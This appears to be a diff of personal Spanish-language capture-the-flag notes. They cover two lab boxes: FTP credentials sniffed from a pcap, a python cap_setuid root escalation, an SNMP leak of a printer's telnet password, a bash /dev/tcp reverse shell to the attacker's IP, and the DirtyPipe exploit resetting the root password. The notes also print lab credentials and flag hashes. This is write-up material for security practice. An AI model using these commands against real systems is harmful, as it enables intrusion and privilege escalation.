@@ -110,32 +110,111 @@ netstat -antup | grep '127.0.0.1' --color=auto
 
 ##### <font color="red">[+]</font> I/O - PsPy<font color="red">:</font> 
 ```bash
-``` 
+```PORT   STATE SERVIC
+23/tcp open  telnet
+telnet $ip
+Trying 10.10.11.107...
+Connected to 10.10.11.107.
+Escape character is '^]'.
 
-```bash
-tshark -r captura.cap | grep -i pass
- tshark -r captura.cap | grep -i pass
-10.10.10.245
-tshark -r captura.cap | grep -i pass
-   38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
-   40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS Buck3tH4TF0RM3!
-tshark -r captura.cap | grep -i user
-   36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
-ftp $ip
-Connected to 10.10.10.245.
-220 (vsFTPd 3.0.3)
-Name (10.10.10.245:ass): nathan
-notas
-python3
-import os
-os.setuid(0)
-os.system("bash")
-9bf59526f5feb3a25eb2aed05c7a03e8
- getcap -r / 2>/dev/null
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
-cat root.txt 
-9109dc71a1ff3b3abb6f38264682c671
+HP JetDirect
+
+se busca la contrasena de ese servicio en internet o aparato
+
+
+ sudo nmap $ip  -sU --top-ports 100 -n -T5 --open
+PORT    STATE SERVICE
+161/udp open  snmp
+/usr/bin/clipp
+/usr/bin/clipp
+
+
+
+
+usamos la herramienta snmpwalk
+
+ONESIXTYONE(1)                                  General Commands Manual                                  ONESIXTYONE(1)
+
+NAME
+       onesixtyone - fast and simple SNMP scanner
+snmpwalk -c asdasd  -v2c $ip
+iso.3.6.1.2.1 = STRING: "HTB Printer"
+❯ snmpwalk -c public -v2c $ip
+iso.3.6.1.2.1 = STRING: "HTB Printer"
+snmpwalk -c public -v2c $ip 1
+iso.3.6.1.2.1 = STRING: "HTB Printer"
+iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
+iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
+
+de ahi se extrae los BITS y se usa xxd -ps -r
+echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
+P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5% 
+ telnet $ip
+Trying 10.10.11.107...
+Connected to 10.10.11.107.
+Escape character is '^]'.
+
+HP JetDirect
+
+Password: P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i
+ telnet $ip
+Trying 10.10.11.107...
+Connected to 10.10.11.107.
+Escape character is '^]'.
+
+HP JetDirect
+
+Password: P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i
+> exec id
+ nc -nlvp 443
+listening on [any] 
+
+
+exec bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"
+
+script /dev/null -c bash
+Script started, file is /dev/null
+This account is currently not available.
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+despues control para bajarla a dormir
+
+stty raw -echo; fg 
+reset xterm
+
+luego checar mi terminal stty size
+regresar y poner 
+stty rows 25 columns 123
+
+listo
+
+
+
+
+export TERM=xterm
+
+
+
+
+https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
+
+470825a2b98965f767ce5541c0e32f1b
+./privesc
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "aaron"...
+system() function call seems to have failed :(
+lp@antique:/tmp$ mkdir a
+en mi caso use el binario de ahi, lo copie en tmp y lo ejecute com>
+primero guardado como privesc.c
+
+gcc privesc.c -o privesc
+./privesc
+
+
+luego solo use el
+su root
+pass: aaron
+funciono.
